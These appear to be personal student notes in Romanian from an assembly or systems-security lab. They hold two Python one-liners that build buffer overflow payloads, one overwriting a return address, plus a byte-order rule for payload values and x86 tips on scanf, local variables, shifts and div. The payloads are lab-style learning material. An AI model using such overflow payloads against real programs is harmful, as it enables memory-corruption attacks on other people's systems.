buffer overflow
python3 -c "import sys; sys.stdout.buffer.write(b'A'*60 + b'\xF4\xF3\xF2\xF1' + b'A'*4 + b'\xb6\x94\x04\x08')"
daca fac buffer overflow la o valoare numerice, atunci o dau pe dos (daca x = 0xDEADBEEF, atunci dau '\xef\xbe\xad\de')
daca fac buffer overflow la un sir de caractere, atunci dau in ordinea normala (daca x = "ABC", atunci dau 'ABC')
python3 -c "import sys; sys.stdout.buffer.write(b'A'*10 + b'Bye' + b'\x00')"

daca ebx are incarcat in el un sir, si vreau sa citesc primul element din acel sir, pot face

push ebx
push fmt
call scanf
add esp, 8

si in [ebx] se va afla valoarea citita

alocare variabila locala:

sub esp, 4
mov eax, esp

si acum in eax voi avea adresa unei variabile locale
pentru a citi in ea pot face

push eax
push fmt
call scanf
add esp, 8
mov ebx, [eax]

shr imparte, shl inmulteste!

nu uita cand faci div, ca edx sa fie 0!
